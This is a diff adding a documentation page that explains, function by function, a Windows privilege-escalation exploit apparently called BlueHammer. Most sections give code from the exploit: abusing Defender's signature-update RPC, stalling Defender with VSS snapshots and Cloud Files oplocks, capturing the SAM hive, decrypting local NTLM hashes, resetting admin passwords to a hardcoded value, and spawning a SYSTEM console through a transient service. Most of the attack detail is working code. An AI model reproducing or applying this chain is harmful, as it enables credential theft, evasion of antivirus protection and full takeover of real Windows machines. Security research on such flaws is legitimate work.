@@ -1,0 +1,773 @@
+---
+title: 'Key functions'
+description: 'Function-by-function reference for all significant routines in FunnyApp.cpp.'
+---
+
+<Warning>
+  This reference is provided for security research purposes only. All functions described below
+  are part of the BlueHammer proof-of-concept exploit.
+</Warning>
+
+Each accordion below documents one function: its signature as it appears in the source, its
+purpose, key parameters, return value, and the most important section of its implementation.
+
+---
+
+<AccordionGroup>
+
+<Accordion title="CheckForWDUpdates()">
+
+**File:** `FunnyApp.cpp:785`
+
+```cpp
+bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
+```
+
+**Purpose:** Queries the Windows Update Agent COM API to determine whether a pending Defender
+signature-definition update exists on the local machine.
+
+**Parameters:**
+- `updatetitle` — caller-allocated buffer; receives the update title string on success.
+- `criterr` — set to `true` on any COM initialisation or interface failure (as opposed to a
+  simple "no updates found" condition).
+
+**Return value:** `true` if a matching update is found; `false` otherwise.
+
+**Key implementation:** The function creates an `IUpdateSession`, calls `Search(L"")` to retrieve
+all pending updates, then iterates each update's category list requiring both
+`"Microsoft Defender Antivirus"` and `"Definition Updates"` to be present simultaneously:
+
+```cpp
+IsWdUdpate = _wcsicmp(catname, L"Microsoft Defender Antivirus") == 0;
+IsSigUpdate = _wcsicmp(catname, L"Definition Updates") == 0;
+updatesfound = IsWdUdpate && IsSigUpdate;
+if (updatesfound) break;
+```
+
+All COM interfaces are released in the `cleanup` label block; `CoUninitialize` is always called.
+
+</Accordion>
+
+<Accordion title="GetUpdateFiles()">
+
+**File:** `FunnyApp.cpp:599`
+
+```cpp
+UpdateFiles* GetUpdateFiles(int* filecount = NULL)
+```
+
+**Purpose:** Downloads the MpSigStub update installer from Microsoft's FWLink URL, parses its PE
+`.rsrc` section to locate the embedded cabinet file, and extracts all cabinet members into
+heap-allocated `UpdateFiles` nodes.
+
+**Parameters:**
+- `filecount` — optional pointer incremented once per extracted file.
+
+**Return value:** Pointer to the head of a linked list of `UpdateFiles` structs, or `NULL` on
+failure. Caller owns all heap memory.
+
+**Key implementation:** WinInet fetches the file; `GetCabFileFromBuff` locates the cabinet; then
+the FDI API is initialised with fully custom in-memory I/O callbacks so no data is ever written to
+disk during extraction:
+
+```cpp
+hcabctx = FDICreate((PFNALLOC)CUST_FNALLOC, CUST_FNFREE,
+                    (PFNOPEN)CUST_FNOPEN, (PFNREAD)CUST_FNREAD,
+                    (PFNWRITE)CUST_FNWRITE, (PFNCLOSE)CUST_FNCLOSE,
+                    (PFNSEEK)CUST_FNSEEK, cpuUNKNOWN, &erfstruct);
+extractres = FDICopy(hcabctx, (char*)"\\update.cab", (char*)"C:\\temp",
+                     NULL, (PFNFDINOTIFY)CUST_FNFDINOTIFY, NULL, &CabOpArgs);
+```
+
+After extraction the `CabOpArguments` linked list is walked to build the `UpdateFiles` list and
+all intermediate buffers are freed.
+
+</Accordion>
+
+<Accordion title="GetCabFileFromBuff()">
+
+**File:** `FunnyApp.cpp:465`
+
+```cpp
+void* GetCabFileFromBuff(PIMAGE_DOS_HEADER pvRawData,
+                         ULONG cbRawData,
+                         ULONG* cabsz)
+```
+
+**Purpose:** Walks a raw PE image in a heap buffer to find the first resource data entry in the
+`.rsrc` section, adjusting its virtual address to a raw-file offset so the cabinet can be
+accessed without mapping the image.
+
+**Parameters:**
+- `pvRawData` — pointer to the downloaded PE image.
+- `cbRawData` — size of the buffer in bytes; used for all bounds checks.
+- `cabsz` — receives the cabinet blob's size in bytes.
+
+**Return value:** Pointer into `pvRawData` at the cabinet start, or `NULL` if headers are invalid
+or the `.rsrc` section is absent.
+
+**Key implementation:** After validating DOS and NT headers, the code iterates `IMAGE_SECTION_HEADER`
+entries looking for the `.rsrc` section name, then walks the `IMAGE_RESOURCE_DIRECTORY` tree to
+find the first non-directory leaf entry:
+
+```cpp
+char rsrc[] = ".rsrc";
+if (memcmp(pish->Name, rsrc, sizeof(rsrc)) == 0)
+{
+    // Walk resource directory to find first data entry
+    while (pird->NumberOfNamedEntries + pird->NumberOfIdEntries)
+    {
+        pirde = &pird->DirectoryEntries[0];
+        if (!pirde->DataIsDirectory)
+        {
+            pdata = (PIMAGE_RESOURCE_DATA_ENTRY)
+                    RtlOffsetToPointer(prsrc, pirde->OffsetToData);
+            pdata->OffsetToData -= pish->VirtualAddress - pish->PointerToRawData;
+            void* cabfile = RtlOffsetToPointer(pvRawData, pdata->OffsetToData);
+            if (cabsz) *cabsz = pdata->Size;
+            return cabfile;
+        }
+        pird = (PIMAGE_RESOURCE_DIRECTORY2)
+               RtlOffsetToPointer(prsrc, pirde->OffsetToDirectory);
+    }
+}
+```
+
+</Accordion>
+
+<Accordion title="CallWD() and WDCallerThread">
+
+**File:** `FunnyApp.cpp:265` and `292`
+
+```cpp
+void CallWD(WDRPCWorkerThreadArgs* args)
+DWORD WINAPI WDCallerThread(void* args)
+```
+
+**Purpose:** Issues the `ServerMpUpdateEngineSignature` ALPC/RPC call to the Windows Defender
+service, directing it to process a signature update from an attacker-controlled directory.
+`WDCallerThread` is the thread entry point that simply calls `CallWD`.
+
+**Parameters (`WDRPCWorkerThreadArgs`):**
+- `hntfythread` — handle to the main thread; used by `RaiseExceptionInThread` to abort on RPC failure.
+- `hevent` — signalled after the RPC returns (success or failure).
+- `res` — receives the `RPC_STATUS` return value.
+- `dirpath` — wide-string path of the update directory to pass to WD.
+
+**Return value:** `WDCallerThread` returns `ERROR_SUCCESS`; `CallWD` is void.
+
+**Key implementation:**
+
+```cpp
+RPC_WSTR MS_WD_UUID = (RPC_WSTR)L"c503f532-443a-4c69-8300-ccd1fbdb3839";
+RpcStringBindingComposeW(MS_WD_UUID, (RPC_WSTR)L"ncalrpc", NULL,
+    (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24",
+    NULL, &StringBinding);
+RpcBindingFromStringBindingW(StringBinding, &bindhandle);
+// 0x8050A003 = MPCLIENT_E_BAD_SIGNATURE_FILE possible here
+RPC_STATUS stat = Proc42_ServerMpUpdateEngineSignature(
+    bindhandle, NULL, args->dirpath, &errstat);
+args->res = stat;
+if (args->hevent) SetEvent(args->hevent);
+```
+
+On RPC setup failure the function calls `RaiseExceptionInThread(args->hntfythread)` which
+redirects the main thread's `RIP` register to `ThrowFunc` (which executes `throw 0`), causing the
+`try/catch` in `wmain` to jump to `cleanup`.
+
+</Accordion>
+
+<Accordion title="RaiseExceptionInThread()">
+
+**File:** `FunnyApp.cpp:251`
+
+```cpp
+void RaiseExceptionInThread(HANDLE hthread)
+```
+
+**Purpose:** Redirects the instruction pointer of a suspended thread to `ThrowFunc` so that a
+C++ exception is raised in that thread's context. Used by `CallWD` to abort `wmain` when an RPC
+setup error occurs.
+
+**Parameters:**
+- `hthread` — handle to the thread to redirect (must have `THREAD_SUSPEND_RESUME |
+  THREAD_GET_CONTEXT | THREAD_SET_CONTEXT` access).
+
+**Return value:** None.
+
+**Key implementation:**
+
+```cpp
+void ThrowFunc() { throw 0; }
+
+void RaiseExceptionInThread(HANDLE hthread)
+{
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_FULL;
+    SuspendThread(hthread);
+    if (GetThreadContext(hthread, &ctx))
+    {
+        ctx.Rip = (DWORD64)ThrowFunc;
+        SetThreadContext(hthread, &ctx);
+        ResumeThread(hthread);
+    }
+}
+```
+
+This technique only works reliably on x64 because `Rip` is a 64-bit register. The approach is
+fragile: if the target thread holds a lock or is in a system call at the time of suspension, the
+redirected execution will behave unpredictably.
+
+</Accordion>
+
+<Accordion title="TriggerWDForVS()">
+
+**File:** `FunnyApp.cpp:1593`
+
+```cpp
+bool TriggerWDForVS(HANDLE hreleaseevent, wchar_t* fullvsspath)
+```
+
+**Purpose:** Triggers Windows Defender to initiate a VSS snapshot (by scanning an EICAR file),
+holds the snapshot device stable using a batch oplock on `RstrtMgr.dll`, then detects the new
+shadow volume and freezes WD through the Cloud Files mechanism.
+
+**Parameters:**
+- `hreleaseevent` — handle passed to `FreezeVSS` as the cleanup signal; signalled by `wmain` after the SAM file is captured.
+- `fullvsspath` — output buffer receiving the NT device path of the new shadow volume (e.g., `\Device\HarddiskVolumeShadowCopy5`).
+
+**Return value:** `true` on success; `false` if any sub-step fails.
+
+**Key implementation:** The EICAR string is reversed at runtime to avoid triggering real-time
+protection on the binary itself:
+
+```cpp
+char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
+rev(eicar);
+hfile = CreateFile(eicarfilepath, ..., FILE_FLAG_DELETE_ON_CLOSE, NULL);
+WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL);
+// Second open triggers WD scan → VSS creation
+trigger = CreateFile(eicarfilepath, GENERIC_READ, FILE_SHARE_READ|..., ...);
+```
+
+</Accordion>
+
+<Accordion title="ShadowCopyFinderThread()">
+
+**File:** `FunnyApp.cpp:1161`
+
+```cpp
+DWORD WINAPI ShadowCopyFinderThread(void* fullvsspath)
+```
+
+**Purpose:** Polls the `\Device` object-manager directory for a new `HarddiskVolumeShadowCopy*`
+device that did not exist when the thread started, then confirms the snapshot is accessible before
+writing its NT path to the output buffer.
+
+**Parameters:**
+- `fullvsspath` — `wchar_t[MAX_PATH]` output buffer; receives `\Device\HarddiskVolumeShadowCopyN` on success.
+
+**Return value:** `ERROR_SUCCESS` (0) on success; a Win32 error code on failure.
+
+**Key implementation:** The thread snapshots the pre-existing shadow copies via
+`RetrieveCurrentVSSList`, then repeatedly calls `NtQueryDirectoryObject` until a new name appears:
+
+```cpp
+// Tight poll loop
+scanagain:
+    _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, restartscan, ...);
+    for (ULONG i = 0; ...) {
+        if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0) {
+            wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
+            if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, ...) == 0) {
+                // check not in vsinitial list
+                if (!found) { srchfound = true; /* record name */ break; }
+            }
+        }
+    }
+    if (!srchfound) { restartscan = true; goto scanagain; }
+```
+
+Once found, `NtCreateFile` on `{newvsspath}\Windows` is retried on `STATUS_NO_SUCH_DEVICE` until
+the volume is fully mounted.
+
+</Accordion>
+
+<Accordion title="RetrieveCurrentVSSList()">
+
+**File:** `FunnyApp.cpp:1028`
+
+```cpp
+LLShadowVolumeNames* RetrieveCurrentVSSList(
+    HANDLE hobjdir,
+    bool*  criticalerr,
+    int*   vscnumber,
+    DWORD* errorcode)
+```
+
+**Purpose:** Enumerates all existing `HarddiskVolumeShadowCopy*` device objects in the `\Device`
+object-manager directory and returns them as a linked list. Used as the baseline by
+`ShadowCopyFinderThread` to filter pre-existing volumes.
+
+**Parameters:**
+- `hobjdir` — open handle to the `\Device` object-manager directory.
+- `criticalerr` — set to `true` on allocation or API failure.
+- `vscnumber` — incremented once per matching device found.
+- `errorcode` — receives a Win32 error code on failure.
+
+**Return value:** Pointer to the head of an `LLShadowVolumeNames` linked list, or `NULL` if none
+exist or on failure. Caller must free with `DestroyVSSNamesList`.
+
+**Key implementation:** Uses `NtQueryDirectoryObject` with dynamic buffer resizing on
+`STATUS_MORE_ENTRIES`, then walks the returned `OBJECT_DIRECTORY_INFORMATION` array:
+
+```cpp
+stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz,
+                               FALSE, FALSE, &scanctx, &retsz);
+// resize loop on STATUS_MORE_ENTRIES...
+for (ULONG i = 0; i < ULONG_MAX; i++) {
+    if (memcmp(&objdirinfo[i], emptybuff, ...) == 0) break;
+    if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0) {
+        wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
+        if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, ...) == 0) {
+            // build linked list node
+        }
+    }
+}
+```
+
+</Accordion>
+
+<Accordion title="FreezeVSS()">
+
+**File:** `FunnyApp.cpp:1455`
+
+```cpp
+DWORD WINAPI FreezeVSS(void* arg)
+```
+
+**Purpose:** Registers the executable's directory as a Cloud Files sync root, connects with a
+`CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS` handler, and stalls Windows Defender's update scan thread
+via an oplock on a lock file — keeping WD frozen during the directory-manipulation window.
+
+**Parameters (`cloudworkerthreadargs`):**
+- `hlock` — existing handle to `RstrtMgr.dll`; closed inside `FreezeVSS` once the sync root is connected.
+- `hcleanupevent` — signalled by `wmain` when the SAM file has been captured; causes `FreezeVSS` to tear down the sync root.
+- `hvssready` — signalled by `FreezeVSS` once the `.lock` file oplock is granted (WD is frozen).
+
+**Return value:** `STATUS_SUCCESS` (0) on success; a Win32 error code on failure.
+
+**Key implementation:** Sync root registration and connection:
+
+```cpp
+CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_NONE);
+CfConnectSyncRoot(syncroot, callbackreg, &callbackctx,
+    CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO |
+    CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
+// Close the RstrtMgr.dll oplock handle — lets WD continue into the sync root query
+CloseHandle(args->hlock); args->hlock = NULL;
+WaitForSingleObject(callbackctx.hnotifywdaccess, INFINITE); // callback will set this
+DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, ..., &ovd); // on .lock file
+SetEvent(callbackctx.hnotifylockcreated); // allow CfExecute to send placeholder
+GetOverlappedResult(hlock, &ovd, &nwf, TRUE); // blocks until WD opens the placeholder
+SetEvent(args->hvssready); // WD is frozen; notify wmain
+WaitForSingleObject(args->hcleanupevent, INFINITE); // wait for cleanup signal
+```
+
+</Accordion>
+
+<Accordion title="CfCallbackFetchPlaceHolders()">
+
+**File:** `FunnyApp.cpp:1370`
+
+```cpp
+void CfCallbackFetchPlaceHolders(
+    _In_ CONST CF_CALLBACK_INFO*       CallbackInfo,
+    _In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters)
+```
+
+**Purpose:** Cloud Files callback invoked when any process queries the registered sync-root
+directory. Checks whether the querying process is Windows Defender (`GetWDPID() == cpi->ProcessId`);
+if so, signals `hnotifywdaccess` and delivers one placeholder file via `CfExecute`, holding WD's
+thread open until the `.lock` oplock fires.
+
+**Parameters:** Standard Cloud Files callback parameters; `CallbackInfo->CallbackContext` points
+to a `cldcallbackctx` carrying the two event handles and the lock filename.
+
+**Return value:** None (Cloud Files callbacks are void).
+
+**Key implementation:** For the WD process path:
+
+```cpp
+CF_PROCESS_INFO* cpi = CallbackInfo->ProcessInfo;
+if (GetWDPID() == cpi->ProcessId)
+{
+    cldcallbackctx* ctx = (cldcallbackctx*)CallbackInfo->CallbackContext;
+    SetEvent(ctx->hnotifywdaccess);     // Stage 5 unblocked
+
+    // Build one CF_PLACEHOLDER_CREATE_INFO with the .lock filename
+    placeholder[0].RelativeFileName = ctx->filename; // "{UUID}.lock"
+    placeholder[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE;
+
+    WaitForSingleObject(ctx->hnotifylockcreated, INFINITE); // wait for oplock
+    CfExecute(&cfopinfo, &cfopparams);  // deliver placeholder; holds WD open
+    return;
+}
+// Non-WD processes get an empty placeholder list
+cfopparams.TransferPlaceholders.PlaceholderCount = 0;
+CfExecute(&cfopinfo, &cfopparams);
+```
+
+</Accordion>
+
+<Accordion title="GetWDPID()">
+
+**File:** `FunnyApp.cpp:1344`
+
+```cpp
+DWORD GetWDPID()
+```
+
+**Purpose:** Returns the process ID of the running `WinDefend` service. The result is cached in a
+static local variable so the SCM is only queried once.
+
+**Parameters:** None.
+
+**Return value:** `DWORD` PID of the WinDefend service process, or `0` on failure.
+
+**Key implementation:**
+
+```cpp
+SC_HANDLE scmgr = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+SC_HANDLE hsvc  = OpenService(scmgr, L"WinDefend", SERVICE_QUERY_STATUS);
+SERVICE_STATUS_PROCESS ssp = { 0 };
+QueryServiceStatusEx(hsvc, SC_STATUS_PROCESS_INFO,
+                     (LPBYTE)&ssp, reqsz, &reqsz);
+retval = ssp.dwProcessId;
+```
+
+</Accordion>
+
+<Accordion title="GetLSASecretKey()">
+
+**File:** `FunnyApp.cpp:1785`
+
+```cpp
+bool GetLSASecretKey(unsigned char bootkeybytes[16])
+```
+
+**Purpose:** Reconstructs the Windows boot key (also called the system key or SysKey) by reading
+the class names of four subkeys under `SYSTEM\CurrentControlSet\Control\Lsa` and permuting the
+resulting hex string through a known fixed index table.
+
+**Parameters:**
+- `bootkeybytes` — caller-allocated 16-byte output buffer receiving the permuted boot key.
+
+**Return value:** `true` on success; `false` (actually `1` — a source bug) if the concatenated
+class-name string is shorter than 16 characters.
+
+**Key implementation:**
+
+```cpp
+const wchar_t* keynames[] = { L"JD", L"Skew1", L"GBG", L"Data" };
+int indices[] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
+
+// Read class names (concatenated hex characters) from registry
+for (const wchar_t* keyname : keynames) {
+    RegOpenKeyEx(hlsa, keyname, NULL, KEY_QUERY_VALUE, &hbootkey);
+    RegQueryInfoKeyA(hbootkey, &data[index], &retsz, ...);
+    index += retsz;
+}
+// Decode hex string → bytes, then permute
+hex_string_to_bytes(data, keybytes, 16);
+for (int i = 0; i < 16; i++)
+    bootkeybytes[i] = keybytes[indices[i]];
+```
+
+</Accordion>
+
+<Accordion title="UnprotectPasswordEncryptionKey()">
+
+**File:** `FunnyApp.cpp:1974`
+
+```cpp
+void* UnprotectPasswordEncryptionKey(char* samKey,
+                                     unsigned char* lsaKey,
+                                     int* keysz)
+```
+
+**Purpose:** Decrypts the Password Encryption Key (PEK) stored in the SAM domain `F` value using
+the boot key. Dispatches to an AES-based decryption path (encryption type `2`); other types
+trigger `__debugbreak()`.
+
+**Parameters:**
+- `samKey` — raw bytes of the `SAM\Domains\Account\F` registry value.
+- `lsaKey` — 16-byte boot key from `GetLSASecretKey`.
+- `keysz` — receives the decrypted PEK size (always `SHA256_DIGEST_LENGTH` = 32 for type 2).
+
+**Return value:** Heap-allocated buffer containing the decrypted PEK, or `NULL` on failure.
+Caller is responsible for freeing.
+
+**Key implementation:** For encryption type `2` the function reads the IV from offset `0x08`,
+ciphertext from offset `0x18`, and a trailing HMAC/hash for integrity verification:
+
+```cpp
+int enctype = samKey[0x68]; // must be 2
+// delegate to UnprotectPasswordEncryptionKeyAES which:
+//   1. Decrypts ciphertext with AES-128-CBC(lsaKey, iv)
+//   2. Computes SHA-256 of plaintext
+//   3. Verifies against the decrypted hash field
+//   4. Returns the plaintext PEK
+```
+
+</Accordion>
+
+<Accordion title="UnprotectNTHash()">
+
+**File:** `FunnyApp.cpp:2172`
+
+```cpp
+void* UnprotectNTHash(char* key,
+                      int   keysz,
+                      char* encryptedHash,
+                      int   enchashsz,
+                      int*  outsz,
+                      ULONG rid)
+```
+
+**Purpose:** Top-level two-stage NTLM hash decryption: first AES-128-CBC with the PEK, then
+dual DES-ECB blocks keyed from the user's RID.
+
+**Parameters:**
+- `key` / `keysz` — the PEK and its size.
+- `encryptedHash` / `enchashsz` — the raw `V` value NT hash field and its length.
+- `outsz` — receives the decrypted hash size (16 bytes).
+- `rid` — the account's relative identifier, used as DES key material.
+
+**Return value:** Heap-allocated 16-byte NTLM hash buffer, or `NULL` on failure.
+
+**Key implementation:**
+
+```cpp
+// Stage 1: AES-CBC
+void* dec = UnprotectPasswordHash(key, keysz, encryptedHash, enchashsz, rid, &_outsz);
+// Stage 2: RID-based DES
+void* _hash = UnproctectPasswordHashDES((char*)dec, _outsz, &_hashoutsz, rid);
+```
+
+`UnproctectPasswordHashDES` derives two 7-byte keys from different byte permutations of the 4-byte
+RID value, passes each through `DeriveDESKey` to produce an 8-byte odd-parity DES key, and
+decrypts the first and second 8-byte halves of the AES plaintext separately.
+
+</Accordion>
+
+<Accordion title="DeriveDESKey()">
+
+**File:** `FunnyApp.cpp:2101`
+
+```cpp
+char* DeriveDESKey(char data[7])
+```
+
+**Purpose:** Converts a 7-byte input (derived from the account RID) into an 8-byte odd-parity DES
+key using the standard bit-spreading algorithm used by Windows SAM.
+
+**Parameters:**
+- `data` — 7-byte key material.
+
+**Return value:** Heap-allocated 8-byte DES key. Caller must free.
+
+**Key implementation:**
+
+```cpp
+for (int i = 0; i < 8; i++) {
+    int j = 7 - i;
+    int curr = (k >> (7 * j)) & 0x7F;
+    int b = curr;
+    b ^= b >> 4; b ^= b >> 2; b ^= b >> 1;
+    int keybyte = (curr << 1) ^ (b & 1) ^ 1;  // set odd parity bit
+    key[i] = (char)keybyte;
+}
+```
+
+This is the algorithm originally described in L0phtCrack and reimplemented here using Windows
+CryptoAPI.
+
+</Accordion>
+
+<Accordion title="CalculateNTLMHash()">
+
+**File:** `FunnyApp.cpp:2227`
+
+```cpp
+char* CalculateNTLMHash(char* _input)
+```
+
+**Purpose:** Computes the NTLM hash (MD4 of the UTF-16LE password) using `CryptCreateHash` with
+`CALG_MD4`.
+
+**Parameters:**
+- `_input` — null-terminated ASCII password string.
+
+**Return value:** Heap-allocated 16-byte MD4 digest. Caller must free.
+
+**Key implementation:** The ASCII input is manually widened to UTF-16LE before hashing:
+
+```cpp
+for (int i = 0; i < pw_len; i++) {
+    input[i * 2]     = _input[i];
+    input[i * 2 + 1] = '\0';
+}
+CryptCreateHash(hprov, CALG_MD4, NULL, NULL, &Hhash);
+CryptHashData(Hhash, (const BYTE*)input, pw_len * 2, NULL);
+CryptGetHashParam(Hhash, HP_HASHVAL, (BYTE*)md_value, &inputsz, NULL);
+```
+
+</Accordion>
+
+<Accordion title="ChangeUserPassword()">
+
+**File:** `FunnyApp.cpp:2274`
+
+```cpp
+bool ChangeUserPassword(wchar_t* username,
+                        void*    nthash,
+                        char*    newpassword,
+                        char*    newNTLMHash = NULL)
+```
+
+**Purpose:** Changes a local account password via the internal SAM RPC interface (`samlib.dll`),
+using the known current NTLM hash to authenticate the change without knowing the plaintext password.
+
+**Parameters:**
+- `username` — wide-string account name.
+- `nthash` — pointer to the 16-byte current NTLM hash (the "old" credential).
+- `newpassword` — ASCII new password; hashed with `CalculateNTLMHash` if `newNTLMHash` is `NULL`.
+- `newNTLMHash` — pre-computed new NTLM hash; overrides `newpassword` computation if supplied.
+
+**Return value:** `true` on success; `false` on any SAM/LSA API failure.
+
+**Key implementation:** All SAM functions are dynamically imported from `samlib.dll` to avoid a
+static import:
+
+```cpp
+wchar_t libpath[MAX_PATH] = { 0 };
+ExpandEnvironmentStrings(L"%windir%\\System32\\samlib.dll", libpath, MAX_PATH);
+HMODULE hm = LoadLibrary(libpath);
+// GetProcAddress for SamConnect, SamOpenDomain, SamOpenUser, SamiChangePasswordUser
+_SamConnect(NULL, &hsrv, MAXIMUM_ALLOWED, false);
+// Resolve DomainSid via LsaQueryInformationPolicy + LsaLookupNames
+_SamOpenDomain(hsrv, MAXIMUM_ALLOWED, domaininfo->DomainSid, &hdomain);
+_SamOpenUser(hdomain, MAXIMUM_ALLOWED, lsatrans->RelativeId, &huser);
+_SamiChangePasswordUser(huser,
+    false, (BYTE*)oldLm, (BYTE*)newLm,   // LM not used
+    true,  (BYTE*)oldNTLM, (BYTE*)newNTLM);
+```
+
+</Accordion>
+
+<Accordion title="DoSpawnShellAsAllUsers()">
+
+**File:** `FunnyApp.cpp:2481`
+
+```cpp
+bool DoSpawnShellAsAllUsers(wchar_t* sampath)
+```
+
+**Purpose:** Opens the captured SAM hive offline, decrypts every local account NTLM hash,
+temporarily sets each account's password to a known value, logs on to check for admin rights,
+and — for the first admin account found — creates a transient SYSTEM service that delivers a
+SYSTEM-privilege console in the caller's session. Passwords are restored after each logon.
+
+**Parameters:**
+- `sampath` — path to the captured SAM file written in Stage 7.
+
+**Return value:** `true` on success (all hash enumeration completed); `false` on setup failure.
+
+**Key implementation — service creation for SYSTEM shell:**
+
+```cpp
+// Impersonate admin token at medium integrity level
+ImpersonateLoggedOnUser(htoken2);
+SC_HANDLE hmgr = OpenSCManager(NULL, NULL,
+    SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
+wsprintf(servicecmd, L"\"%s\" %d", binpath, currentsesid);
+SC_HANDLE hsvc = CreateService(hmgr, wuid2, wuid2, GENERIC_ALL,
+    SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
+    SERVICE_ERROR_IGNORE, servicecmd, NULL, ...);
+StartService(hsvc, NULL, NULL);
+Sleep(100);
+DeleteService(hsvc);   // transient: exists only long enough to start
+RevertToSelf();
+```
+
+The hardcoded new password used during the transient logon window is `$PWNed666!!!WDFAIL`.
+
+</Accordion>
+
+<Accordion title="IsRunningAsLocalSystem()">
+
+**File:** `FunnyApp.cpp:2825`
+
+```cpp
+bool IsRunningAsLocalSystem()
+```
+
+**Purpose:** Checks whether the current process token belongs to the `NT AUTHORITY\SYSTEM` account
+(well-known SID `WinLocalSystemSid`). Used as the entry-point branch in `wmain` to distinguish the
+SYSTEM-service invocation from the initial user-mode invocation.
+
+**Parameters:** None.
+
+**Return value:** `true` if the process is running as Local System; `false` otherwise.
+
+**Key implementation:**
+
+```cpp
+OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken);
+GetTokenInformation(htoken, TokenUser,
+                    tokenuser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retsz);
+return IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
+```
+
+</Accordion>
+
+<Accordion title="LaunchConsoleInSessionId()">
+
+**File:** `FunnyApp.cpp:2843`
+
+```cpp
+void LaunchConsoleInSessionId(DWORD sessionid)
+```
+
+**Purpose:** From a SYSTEM context, duplicates the current process token, assigns it to the
+specified interactive session, and spawns `conhost.exe` as a visible console in that session.
+Called by the transient SYSTEM service to deliver a SYSTEM shell to the attacker's desktop.
+
+**Parameters:**
+- `sessionid` — the target interactive session ID (passed as `argv[1]` to the service instance).
+
+**Return value:** None.
+
+**Key implementation:**
+
+```cpp
+OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken);
+SetPrivilege(htoken, SE_TCB_NAME, TRUE);
+SetPrivilege(htoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
+// ...
+DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL,
+                 SecurityDelegation, TokenPrimary, &hnewtoken);
+SetTokenInformation(hnewtoken, TokenSessionId,
+                    &sessionid, sizeof(DWORD));
+CreateProcessAsUser(hnewtoken,
+    L"C:\\Windows\\System32\\conhost.exe",
+    NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+```
+
+`SE_TCB_NAME` (`SeTcbPrivilege`, "Act as part of the operating system") is required for
+`SetTokenInformation` with `TokenSessionId` to succeed from a SYSTEM service.
+
+</Accordion>
+
+</AccordionGroup>
